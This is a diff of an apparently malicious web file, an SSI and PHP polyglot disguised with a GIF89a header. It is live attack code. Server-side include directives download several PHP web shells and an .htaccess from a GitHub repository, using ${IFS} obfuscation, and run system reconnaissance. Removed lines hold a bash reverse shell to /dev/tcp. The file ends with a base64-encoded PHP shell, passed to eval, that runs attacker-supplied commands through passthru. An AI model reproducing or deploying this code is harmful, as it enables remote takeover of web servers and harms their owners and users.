@@ -1,18 +1,14 @@
 <title>INI SSI</title>
 GIF89a
-<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="bash -i >& /dev/tcp/0.0.0.0/1337 0>&1" --> 
-<!--#else -->
-<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#exec cmd="{wget,https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/cmde.php,-O,cmd.php}" -->
 <br>
 <!--#cmd exec="curl${IFS}-Ls${IFS}raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/bc.php${IFS}-o${IFS}bc.php" -->
-!--#cmd exec="curl https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/.htaccess -o .htaccess" -->
+<!--#cmd exec="curl https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/.htaccess -o .htaccess" -->
 <!--#cmd exec="curl${IFS}-Ls${IFS}raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/aws.bak.php${IFS}|${IFS}tee${IFS}-a${IFS}aws.bak.php" -->
 <!--#cmd exec="curl${IFS}-Ls${IFS}raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/s.shtml${IFS}|${IFS}tee${IFS}-a${IFS}bc.shtml" -->
 <!--#exec cmd="ls;dir;pwd;{uname,-a}" -->
-<!--#endif -->
+<br>
 GIF89a;
-<?=$asu = 'PD9waHAKIGdvdG8gUjdOcGU7IElySlBFOiBEOGVlZjogZ290byBRZjg2ZDsgUFd3aUk6IHBhc3N0aHJ1KCRfR0VUWydjbWQnXSk7IGdvdG8gd2FZWEo7IHdhWVhKOiBleGl0OyBnb3RvIFdMT0trOyBSN05wZTogQGVycm9yX3JlcG9ydGluZygwKTsgZ290byBnVGRmNDsgbmV1dmI6IHBhc3N0aHJ1KCRfUkVRVUVTVFsnY21kJ10pOyBnb3RvIGRVSTNMOyBTdzhUWDogaWYgKGVtcHR5KCRfR0VUWydjbWQnXSkpIHsgZ290byBINDVObDsgfSBnb3RvIFBXd2lJOyB6SXZ2cDogZXhpdDsgZ290byBJckpQRTsgZ1RkZjQ6IGlmICghKCFlbXB0eSgkX0dFVFsnaWQnXSkgJiYgZW1wdHkoJF9HRVRbJ2NtZCddKSkpIHsgZ290byBEOGVlZjsgfSBnb3RvIGVOOVptOyBlTjlabTogcGFzc3RocnUoJ2lkJyk7IGdvdG8gekl2dnA7IGRVSTNMOiBleGl0OyBnb3RvIGdhS1pUOyBnYUtaVDogYW4wM3o6IGdvdG8gU3c4VFg7IFFmODZkOiBpZiAoZW1wdHkoJF9SRVFVRVNUWydjbWQnXSkpIHsgZ290byBhbjAzejsgfSBnb3RvIG5ldXZiOyBXTE9LazogSDQ1Tmw6IGdvdG8geHB1M2I7IHhwdTNiOiBlY2hvIHBocF91bmFtZSgpOwo=';
+<?=@$asu = 'PD9waHAKIGdvdG8gUjdOcGU7IElySlBFOiBEOGVlZjogZ290byBRZjg2ZDsgUFd3aUk6IHBhc3N0aHJ1KCRfR0VUWydjbWQnXSk7IGdvdG8gd2FZWEo7IHdhWVhKOiBleGl0OyBnb3RvIFdMT0trOyBSN05wZTogQGVycm9yX3JlcG9ydGluZygwKTsgZ290byBnVGRmNDsgbmV1dmI6IHBhc3N0aHJ1KCRfUkVRVUVTVFsnY21kJ10pOyBnb3RvIGRVSTNMOyBTdzhUWDogaWYgKGVtcHR5KCRfR0VUWydjbWQnXSkpIHsgZ290byBINDVObDsgfSBnb3RvIFBXd2lJOyB6SXZ2cDogZXhpdDsgZ290byBJckpQRTsgZ1RkZjQ6IGlmICghKCFlbXB0eSgkX0dFVFsnaWQnXSkgJiYgZW1wdHkoJF9HRVRbJ2NtZCddKSkpIHsgZ290byBEOGVlZjsgfSBnb3RvIGVOOVptOyBlTjlabTogcGFzc3RocnUoJ2lkJyk7IGdvdG8gekl2dnA7IGRVSTNMOiBleGl0OyBnb3RvIGdhS1pUOyBnYUtaVDogYW4wM3o6IGdvdG8gU3c4VFg7IFFmODZkOiBpZiAoZW1wdHkoJF9SRVFVRVNUWydjbWQnXSkpIHsgZ290byBhbjAzejsgfSBnb3RvIG5ldXZiOyBXTE9LazogSDQ1Tmw6IGdvdG8geHB1M2I7IHhwdTNiOiBlY2hvIHBocF91bmFtZSgpOwo=';
 EvAL("?>" . base64_decode($asu));
 
